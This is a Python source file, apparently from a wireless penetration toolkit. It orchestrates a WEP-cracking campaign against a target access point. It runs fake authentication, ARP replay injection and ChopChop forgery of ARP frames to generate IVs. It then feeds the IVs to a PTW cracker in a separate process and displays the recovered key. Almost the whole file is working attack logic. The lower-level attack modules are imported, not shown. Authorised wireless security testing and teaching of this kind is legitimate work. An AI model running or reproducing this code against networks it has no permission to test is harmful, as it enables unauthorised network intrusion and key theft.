"""WEP "Generate IVs" campaign orchestrator.

The single thing the Generate IVs button drives. For M3 it's the two
near-term rungs of the escalation ladder:

    1. fake-auth  — associate so the AP accepts our injections
    2. ARP replay — capture an ARP passively, replay it for fresh IVs

When no ARP turns up, ChopChop *forges* one (pausing replay so only one TX
activity uses the radio at a time), then hands the forged ARP back to replay.
That's why replay lives behind ``pause()``/``resume()`` and the campaign — not
the button — owns the "only one TX activity at once" rule.

Coordination falls out naturally: replay only bursts while fake-auth reports
``associated`` (via the ``can_inject`` gate), so if the AP kicks us mid-replay
the reactive re-auth kicks in, replay goes quiet, and resumes once we're back
in. The loop self-heals.
"""

from __future__ import annotations

import asyncio
import logging
from concurrent.futures import ProcessPoolExecutor
from typing import Callable, Optional

from rich.markup import escape

from wifit3.models import AccessPoint
from wifit3.campaigns import treelog
from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.wep.fake_auth import WepFakeAuth
from wifit3.campaigns.wep.arp_replay import WepArpReplay
from wifit3.campaigns.wep.chopchop import WepChopChop
from wifit3.crack.wep import (
    PtwCracker,
    keystream_from_arp_cipher,
)

logger = logging.getLogger(__name__)


def _key_markup(key: bytes) -> str:
    """The recovered key as an unmissable black-on-cyan block (matching the
    Focus CAPTURE panel), with the ASCII form when it's a printable word."""
    ascii_hint = (
        f' = "{key.decode("ascii")}"' if all(0x20 <= b < 0x7F for b in key) else ""
    )
    return f"[bold black on cyan] ✓ CRACKED WEP KEY: {key.hex()}{ascii_hint} [/bold black on cyan]"


class WepCampaign(Campaign):
    """Owns the fake-auth + ARP-replay lifecycle for one WEP target."""

    button_id = "btn-gen-ivs"
    key = "wep"
    hotkey = ("r", "Replay")
    idle_label = "ARP Replay"
    run_label = "Stop Replay"
    idle_variant = "success"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        return (getattr(ap, "encryption", None) or "").upper() == "WEP"

    def __init__(
        self,
        iface,
        target: AccessPoint,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        super().__init__(ap=target, iface=iface)
        self.target = target
        self._log = log_callback or (lambda _m: None)
        self._active = False

        self.cracker = PtwCracker()
        self.recovered_key: Optional[bytes] = None
        self._crack_cursor = 0
        self._crack_started = False
        # The PTW search runs in a separate process.
        self._crack_pool: Optional[ProcessPoolExecutor] = None

        # ChopChop is a "manufacture an ARP seed" sub-mode the user toggles mid-campaign.
        self.chop: Optional[WepChopChop] = None

        self.fake_auth = WepFakeAuth(iface, target, log_callback=self._log)
        self.replay = WepArpReplay(
            iface,
            target,
            iface.wep_store,
            # Replays are re-addressed to come FROM our associated fake-auth STA.
            source_mac=self.fake_auth.source_mac,
            # Only burst while we're actually associated.
            ensure_associated=self.fake_auth.ensure_associated,
            # A replay stall asks for an immediate re-auth instead of
            # discarding the (working) seed.
            request_reauth=self.fake_auth.request_reauth,
            log_callback=self._log,
        )

    async def _loop(self) -> None:
        """Start the fake-auth + ARP-replay daemons, then supervise the PTW crack."""
        self._active = True
        self._log(
            f"[bold green]ARP Replay starting[/bold green] on "
            f"[bold]{escape(self.target.ssid or '<hidden>')}[/bold]"
        )
        self._log(treelog.leaf("[dim](deauth or chop if no ARPs appear)[/dim]"))
        self.fake_auth.start()
        self.replay.start()
        # One reusable worker process for the crack search
        self._crack_pool = ProcessPoolExecutor(max_workers=1)
        logger.info("[WEP-Campaign] Started on %s", self.target.bssid)

        loop = asyncio.get_event_loop()
        while not self.stopped and self.recovered_key is None:
            # Crack cadence is ~3s, but poll self.stopped often so Stop is prompt
            for _ in range(15):
                if self.stopped:
                    return
                await asyncio.sleep(0.2)
            samples = self.iface.wep_store.crack_samples(self.target.bssid)
            for iv, cipher in samples[self._crack_cursor:]:
                self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
            self._crack_cursor = len(samples)
            if not self.cracker.ready or self._crack_pool is None:
                continue
            if not self._crack_started:
                self._crack_started = True
                self._log(
                    "[bold cyan]Cracking Key[/bold cyan] with "
                    "[white]>10k IVs[/white] [dim](may require >40K)[/dim]"
                )
            # Ship the (picklable) cracker to the worker.
            try:
                key = await loop.run_in_executor(self._crack_pool, self.cracker.recover)
            except Exception:
                logger.exception("[WEP-Campaign] crack worker failed")
                continue   # retry next tick on a fresh snapshot
            if key is not None:
                self.recovered_key = key
                self.target.wep_key = key   # persist on the AP (Save / UI)
                self._log(_key_markup(key))
                # Done: stop transmitting (replay + fake-auth keepalive).
                self.replay.stop()
                self.fake_auth.stop()
                return

    async def teardown(self) -> None:
        """Halt the crack pool + ChopChop + replay/fake-auth on every exit."""
        if self._crack_pool:
            # Don't block the UI waiting on an in-flight search
            self._crack_pool.shutdown(wait=False, cancel_futures=True)
            self._crack_pool = None
        # Tear down a running ChopChop sub-mode before the TX it shares the radio with.
        if self.chop is not None:
            self.chop.stop()
            self.chop = None
            self._log("[dim]· ChopChop stopped (Generate IVs ended)[/dim]")
        # Stop replay (TX) before fake-auth
        self.replay.stop()
        self.fake_auth.stop()
        self._active = False
        # Quiet when we stopped because we WON
        if self.recovered_key is None:
            self._log("[bold red]✗ Generate IVs stopped.[/bold red]")
        logger.info("[WEP-Campaign] Stopped on %s", self.target.bssid)

    # ---- ChopChop sub-mode --------------------------------------------------

    def start_chop(self) -> None:
        """Switch to ChopChop: pause replay + run WepChopChop."""
        if not self._active or self.chop is not None:
            return
        self.replay.pause()
        self.chop = WepChopChop(
            self.iface,
            self.target,
            self.iface.wep_store,
            source_mac=self.fake_auth.source_mac,
            on_forged_arp=self._on_chop_success,
            ensure_associated=self.fake_auth.ensure_associated,
            log_callback=self._log,
        )
        self.chop.start()

    def stop_chop(self) -> None:
        if self.chop is None:
            return
        self.chop.stop()
        self.chop = None
        self.replay.resume()

    def _on_chop_success(self, forged_frame: bytes) -> None:
        """Chop FORGED a broadcast ARP (from recovered keystream)."""
        self.chop = None
        self.iface.wep_store.record_broadcast_frame(self.target.bssid, forged_frame)
        self.replay.resume()

    @property
    def chop_active(self) -> bool:
        return self.chop is not None and self.chop.is_active

    @property
    def is_active(self) -> bool:
        return self._active
